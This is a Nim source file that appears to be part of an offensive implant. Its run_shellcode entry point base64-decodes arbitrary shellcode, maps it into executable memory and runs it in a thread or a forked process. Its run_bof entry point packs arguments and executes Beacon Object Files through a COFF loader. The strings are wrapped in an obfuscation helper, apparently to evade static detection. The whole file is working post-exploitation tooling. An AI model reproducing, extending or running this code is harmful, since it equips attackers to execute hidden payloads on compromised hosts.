from std/base64 import decode
import std/json
from std/strutils import parseHexInt, parseInt, strip
import ../utils/global
import ../utils/coffloader/nimcoff
import ../utils/linapi/handlers

type
  ShellcodeKind* = enum
    skShellcode

  ShellFn = proc() {.nimcall.}

proc writeMsg*(msg: string; buf: var openArray[char]): int =
  # Writes a message into the output buffer
  if msg.len > buf.len: return -1
  if msg.len > 0: copyMem(addr buf[0], unsafeAddr msg[0], msg.len)
  msg.len

proc decodePayload(input: string): seq[byte] =
  # Decodes the base64 payload into bytes
  if input.len == 0:
    return @[]
  let raw = decode(input)
  result = newSeq[byte](raw.len)
  if raw.len > 0:
    copyMem(addr result[0], unsafeAddr raw[0], raw.len)

proc isInline(params: string): bool =
  # Checks that the params request inline execution
  try:
    var p = parseJson(params)
    if p.kind == JString:
      let inner = p.getStr().strip()
      if inner.len == 0: return false
      p = parseJson(inner)
    if p.kind != JObject or not p.hasKey(obf("inline")):
      return false
    let v = p[obf("inline")]
    if v.kind == JBool:
      return v.getBool()
    false
  except JsonParsingError:
    false

proc shellcodeTrampoline(param: pointer): pointer {.noconv.} =
  # Calls the shellcode function and returns nil
  let fn = cast[ShellFn](param)
  fn()
  nil

proc runShellcodeInline(payload: openArray[byte]; buf: var openArray[char]): int =
  # Runs the shellcode inside the current process
  if payload.len == 0:
    return writeMsg(obf("Error: empty shellcode"), buf)
  let mem = mapShellcodeMem(payload)
  if mem == nil:
    return writeMsg(obf("Error: allocation failed"), buf)
  inc bgWorkers
  var tid: Pthread
  if not spawnPthread(tid, shellcodeTrampoline, mem):
    dec bgWorkers
    unmapShellcodeMem(mem, payload.len.csize_t)
    return writeMsg(obf("Error: pthread_create failed"), buf)
  joinPthread(tid)
  dec bgWorkers
  unmapShellcodeMem(mem, payload.len.csize_t)
  writeMsg(obf("Shellcode executed inline."), buf)

proc runShellcodeSpawn(payload: openArray[byte]; buf: var openArray[char]): int =
  # Runs the shellcode in a forked process
  if payload.len == 0:
    return writeMsg(obf("Error: empty shellcode"), buf)
  let mem = mapShellcodeMem(payload)
  if mem == nil:
    return writeMsg(obf("Error: allocation failed"), buf)
  if not forkShellcodeAndWait(mem):
    unmapShellcodeMem(mem, payload.len.csize_t)
    return writeMsg(obf("Error: fork failed"), buf)
  unmapShellcodeMem(mem, payload.len.csize_t)
  writeMsg(obf("Shellcode executed."), buf)

proc run_shellcode*(input, params: string; buf: var openArray[char]; kind: ShellcodeKind): int =
  # Entrypoint that runs shellcode inline or in a new process
  let payload = decodePayload(input)
  if payload.len == 0:
    return writeMsg(obf("Error: invalid input"), buf)
  if isInline(params):
    runShellcodeInline(payload, buf)
  else:
    runShellcodeSpawn(payload, buf)

proc packBofArgs(params: string): seq[byte] =
  # Parses the args and packs them into a byte buffer
  var data: seq[byte] = @[]
  var tokens: seq[string] = @[]
  var i = 0
  let rawParams = params.strip()

  while i < rawParams.len:
    while i < rawParams.len and rawParams[i] in {' ', '\t', '\r', '\n'}: inc i
    if i >= rawParams.len: break
    var token = ""

    if i + 1 < rawParams.len and rawParams[i + 1] == ':' and rawParams[i] in {'z', 'Z', 'i', 's', 'b'}:
      token.add rawParams[i]; token.add ':'; inc i, 2
      if i < rawParams.len and rawParams[i] == '"':
        inc i
        while i < rawParams.len and rawParams[i] != '"': token.add rawParams[i]; inc i
        if i < rawParams.len: inc i
      else:
        while i < rawParams.len and rawParams[i] notin {' ', '\t', '\r', '\n'}: token.add rawParams[i]; inc i
    else:
      if i < rawParams.len and rawParams[i] == '"':
        inc i
        while i < rawParams.len and rawParams[i] != '"': token.add rawParams[i]; inc i
        if i < rawParams.len: inc i
      else:
        while i < rawParams.len and rawParams[i] notin {' ', '\t', '\r', '\n'}: token.add rawParams[i]; inc i
    if token.len > 0: tokens.add token

  for token in tokens:
    let hasType = token.len >= 2 and token[1] == ':' and token[0] in {'z', 'Z', 'i', 's', 'b'}
    let typ = if hasType: $token[0] else: ""
    let val = if hasType: token[2 .. ^1] else: token
    case typ
    of obf("z"):
      let s = val & obf("\0")
      let slen = uint32(s.len)
      data.add byte(slen and 0xFF'u32)
      data.add byte((slen shr 8) and 0xFF'u32)
      data.add byte((slen shr 16) and 0xFF'u32)
      data.add byte((slen shr 24) and 0xFF'u32)
      for c in s: data.add byte(c)
    of obf("Z"):
      var wbuf: seq[byte] = @[]
      for c in val:
        wbuf.add byte(c)
        wbuf.add 0x00'u8
      wbuf.add 0x00'u8
      wbuf.add 0x00'u8
      let wlen = uint32(wbuf.len)
      data.add byte(wlen and 0xFF'u32)
      data.add byte((wlen shr 8) and 0xFF'u32)
      data.add byte((wlen shr 16) and 0xFF'u32)
      data.add byte((wlen shr 24) and 0xFF'u32)
      for b in wbuf: data.add b
    of obf("i"):
      let v = uint32(parseInt(val))
      data.add byte(v and 0xFF'u32)
      data.add byte((v shr 8) and 0xFF'u32)
      data.add byte((v shr 16) and 0xFF'u32)
      data.add byte((v shr 24) and 0xFF'u32)
    of obf("s"):
      let v = uint16(parseInt(val))
      data.add byte(v and 0xFF'u16)
      data.add byte((v shr 8) and 0xFF'u16)
    of obf("b"):
      var raw: seq[byte] = @[]
      var j = 0
      while j + 1 < val.len:
        raw.add byte(parseHexInt(val[j .. j + 1]))
        j += 2
      let rlen = uint32(raw.len)
      data.add byte(rlen and 0xFF'u32)
      data.add byte((rlen shr 8) and 0xFF'u32)
      data.add byte((rlen shr 16) and 0xFF'u32)
      data.add byte((rlen shr 24) and 0xFF'u32)
      for b in raw: data.add b
    else:
      let s = val & obf("\0")
      let slen = uint32(s.len)
      data.add byte(slen and 0xFF'u32)
      data.add byte((slen shr 8) and 0xFF'u32)
      data.add byte((slen shr 16) and 0xFF'u32)
      data.add byte((slen shr 24) and 0xFF'u32)
      for c in s: data.add byte(c)

  let dataLen = uint32(data.len)
  result = @[
    byte(dataLen and 0xFF'u32),
    byte((dataLen shr 8) and 0xFF'u32),
    byte((dataLen shr 16) and 0xFF'u32),
    byte((dataLen shr 24) and 0xFF'u32),
  ]
  for b in data: result.add b

proc writeBytes(data: openArray[byte]; buf: var openArray[char]): int =
  # Writes raw bytes into the output buffer
  if data.len > buf.len: return -1
  if data.len > 0: copyMem(addr buf[0], unsafeAddr data[0], data.len)
  data.len

proc run_bof*(input, params: string; buf: var openArray[char]): int =
  # Entrypoint that loads and runs a BOF
  let taskParams = try:
    parseJson(params)
  except JsonParsingError:
    return writeMsg(obf("Error: invalid parameters JSON"), buf)

  if not taskParams.hasKey(obf("file")):
    return writeMsg(obf("Error: missing 'file' in parameters"), buf)

  let bofBytes = decodePayload(input)
  if bofBytes.len == 0:
    return writeMsg(obf("Error: empty or invalid BOF input"), buf)

  var argPtr: pointer = nil
  var argSize: uint32 = 0
  var argsBuf: seq[byte]

  if taskParams.hasKey(obf("args")):
    let rawArgs = taskParams[obf("args")].getStr()
    if rawArgs.len > 0:
      argsBuf = packBofArgs(rawArgs)
      if argsBuf.len > 0:
        argPtr = cast[pointer](addr argsBuf[0])
        argSize = uint32(argsBuf.len)

  let runResult = runCoff(bofBytes, obf("go"), argPtr, argSize)
  let outBytes = bofGetOutputData()

  if outBytes.len > 0:
    return writeBytes(outBytes, buf)

  if not runResult[0]:
    if runResult[2].len > 0:
      return writeMsg(obf("BOF loader error: ") & runResult[2], buf)
    return writeMsg(obf("BOF loader error (code): ") & $runResult[1], buf)

  writeMsg(obf("BOF executed. No output."), buf)
